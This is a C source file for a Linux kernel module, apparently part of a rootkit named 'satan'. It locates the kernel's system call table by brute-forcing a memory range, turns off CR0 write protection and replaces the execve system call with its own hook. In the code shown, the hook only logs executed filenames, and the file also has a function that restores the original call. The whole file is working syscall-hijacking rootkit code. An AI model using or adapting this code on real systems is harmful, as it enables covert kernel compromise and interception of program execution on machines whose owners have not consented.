// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#include "syscall_hijack.h"

#include <linux/kallsyms.h>
#include <linux/module.h>

#include "util.h"

#define BRUTEFORCE_ADDR_BEGIN 0xc0000000
#define BRUTEFORCE_ADDR_END 0xe0000000

static bool found_sys_call_table = false;
static bool hijacked = false;
static unsigned long **sys_call_table_ptr = NULL;
static unsigned long *real_sys_read = NULL;
static unsigned long ptr = 0;

/* from: /usr/src/linux-headers-$(uname -r)/include/linux/syscalls.h */
asmlinkage int (*real_execve)(const char *filename,
                              char *const argv[],
                              char *const envp[]);

asmlinkage int satan_execve(const char *filename,
                          char *const argv[],
                          char *const envp[])
{
        pr_info("satan: hijacked execve(%s, ...)\n", filename);
        return real_execve(filename, argv, envp);
}


void satan_locate_sys_call_table(void)
{
        real_sys_read = (void *) kallsyms_lookup_name("sys_read");
        pr_info("satan: kallsyms: sys_read: %p\n", real_sys_read);

        for (ptr = BRUTEFORCE_ADDR_BEGIN; ptr <= BRUTEFORCE_ADDR_END; ptr++) {
                sys_call_table_ptr = (unsigned long **) ptr;
                if (sys_call_table_ptr[__NR_read] == (unsigned long *) real_sys_read) {
                        sys_call_table_ptr = &(sys_call_table_ptr[0]);
                        found_sys_call_table = true;
                        break;
                }
        }

        if (!found_sys_call_table) {
                pr_info("satan: unable to locate sys_call_table!!!\n");
                return;
        }

        pr_info("satan: located sys_call_table: %p\n", sys_call_table_ptr);
        pr_info("satan: located sys_call_table[__NR_read]: %p\n", sys_call_table_ptr[__NR_read]);
}

void satan_hijack_execve(void)
{
        if (!found_sys_call_table || hijacked) {
                return;
        }

        hijacked = true;

        CR0_WP_DISABLE {
                real_execve = (void *) sys_call_table_ptr[__NR_execve];
                pr_info("satan: original execve: %p\n", real_execve);

                sys_call_table_ptr[__NR_execve] = (unsigned long *) satan_execve;
                pr_info("satan: hijacked execve: %p\n", sys_call_table_ptr[__NR_execve]);
        } CR0_WP_DISABLE_END
}

void satan_restore_execve(void)
{
        if (!found_sys_call_table || !hijacked) {
                return;
        }

        hijacked = false;

        CR0_WP_DISABLE {
                sys_call_table_ptr[__NR_execve] = (unsigned long *) real_execve;
                pr_info("satan: restored sys_execve: %p\n", sys_call_table_ptr[__NR_execve]);
        } CR0_WP_DISABLE_END
}
